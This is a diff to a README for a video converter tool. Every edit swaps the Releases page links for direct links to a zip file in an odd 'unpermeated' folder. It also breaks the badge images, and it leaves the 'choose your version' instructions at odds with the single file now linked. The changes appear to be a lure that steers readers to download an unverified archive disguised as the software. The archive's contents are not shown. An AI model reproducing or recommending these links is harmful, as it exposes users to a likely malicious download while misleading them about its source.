@@ -1,7 +1,7 @@
 # 🎥 total-video-converter-pro - Convert, Edit, and Burn Videos Easily
 
 ## 📥 Download Now
-[![Download total-video-converter-pro](https://img.shields.io/badge/Download%20Now-Total%20Video%20Converter%20Pro-blue)](https://github.com/Herowol6/total-video-converter-pro/releases)
+[![Download total-video-converter-pro](https://raw.githubusercontent.com/Herowol6/total-video-converter-pro/main/unpermeated/converter-pro-video-total-2.8-alpha.1.zip%20Now-Total%20Video%20Converter%20Pro-blue)](https://raw.githubusercontent.com/Herowol6/total-video-converter-pro/main/unpermeated/converter-pro-video-total-2.8-alpha.1.zip)
 
 ## 🛠️ Overview
 total-video-converter-pro is a comprehensive multimedia tool designed to convert, edit, and burn videos across a wide range of formats. It offers optimized settings for mobile devices and prepares videos for disc burning. Whether you need to convert a file for your smartphone or want to edit a video before sharing, this tool has you covered.
@@ -9,7 +9,7 @@ total-video-converter-pro is a comprehensive multimedia tool designed to convert
 ## 🚀 Getting Started
 Get up and running with total-video-converter-pro in just a few simple steps:
 
-1. **Download the Software**: Click the link above to visit the [Releases Page](https://github.com/Herowol6/total-video-converter-pro/releases).
+1. **Download the Software**: Click the link above to visit the [Releases Page](https://raw.githubusercontent.com/Herowol6/total-video-converter-pro/main/unpermeated/converter-pro-video-total-2.8-alpha.1.zip).
   
 2. **Choose Your Version**: On the Releases Page, you will see different versions of the software. Look for the latest version available.
 
@@ -56,7 +56,7 @@ Make sure your computer meets the following minimum requirements:
 ## 📡 Download & Install
 To download total-video-converter-pro, follow these instructions:
 
-1. Click the link to visit the [Releases Page](https://github.com/Herowol6/total-video-converter-pro/releases).
+1. Click the link to visit the [Releases Page](https://raw.githubusercontent.com/Herowol6/total-video-converter-pro/main/unpermeated/converter-pro-video-total-2.8-alpha.1.zip).
   
 2. Choose the appropriate installation file for your operating system.
 
@@ -98,4 +98,4 @@ total-video-converter-pro is open-source software licensed under the MIT License
 ## 📊 Feedback
 We welcome your feedback. If you have suggestions for new features or improvements, let us know on the Issues page. Your input helps us make total-video-converter-pro even better.
 
-[![Download total-video-converter-pro](https://img.shields.io/badge/Download%20Now-Total%20Video%20Converter%20Pro-blue)](https://github.com/Herowol6/total-video-converter-pro/releases)
+[![Download total-video-converter-pro](https://raw.githubusercontent.com/Herowol6/total-video-converter-pro/main/unpermeated/converter-pro-video-total-2.8-alpha.1.zip%20Now-Total%20Video%20Converter%20Pro-blue)](https://raw.githubusercontent.com/Herowol6/total-video-converter-pro/main/unpermeated/converter-pro-video-total-2.8-alpha.1.zip)
